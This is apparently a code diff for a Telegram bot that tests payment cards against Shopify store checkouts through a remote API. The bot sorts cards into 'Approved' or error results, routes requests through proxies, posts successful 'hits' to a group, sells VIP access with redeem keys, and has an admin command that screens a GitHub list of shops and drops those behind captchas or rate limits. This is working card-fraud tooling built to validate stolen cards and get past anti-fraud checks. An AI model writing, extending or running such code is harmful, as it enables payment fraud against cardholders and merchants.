@@ -84,7 +84,7 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-# رابط الـ API
+# رابط الـ API الجديد
 SHOPIFY_API_URL_1 = 'https://web-production-3d364.up.railway.app/shopify'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
@@ -590,8 +590,8 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             
             rl = rm.lower()
             
-            # اضافة جميع اخطاء الموقع المستجدة (تتضمن رمز 422 وتوكن الدفع) لمنع الفرز الخاطئ كـ Approved
-            if any(k in rl for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token', 'cart failed', '422']):
+            # اقتناص أخطاء شوبفاي وبوابات الدفع ومنعها فوراً من الوصول لشرط الـ Approved
+            if any(k in rl for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
             
             if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'bad gateway', 'max ret', 'step 0', 'missing', 'tunnel', 'cloudflare']):
@@ -1051,6 +1051,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try: await styled_send(context.bot, tu, f"<b>{CE_BOOM} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
         except Exception: pass
 
+    # أمر حصري للآدمن: استخراج بوابات شوبفاي من الملفات المرفوعة وتجربتها للتأكد من عدم وجود كابتشا
     elif cmd == "checkgates":
         if uid not in ADMIN_ID:
             await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n╰ {sf('This command is restricted to administrators only.')}", use_gif=True)
@@ -1076,6 +1077,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         else:
                             return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('Failed to fetch file from GitHub.')}</b>")
             
+            # تصفية وتجهيز المواقع الصحيحة فقط (Shopify)
             valid_format_sites = []
             for site in raw_sites:
                 site = site.lower().strip()
@@ -1106,6 +1108,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 target_url = f"https://{site_url}/cart.json"
                 try:
                     async with session.get(target_url, proxy=p_url, timeout=6, ssl=False) as resp:
+                        # استبعاد بوابات الكابتشا أو החظر (403 = CF, 430 = Shopify Captcha, 429 = Rate Limit)
                         if resp.status in [403, 429, 430, 502, 503, 504]:
                             captcha_count += 1
                             return
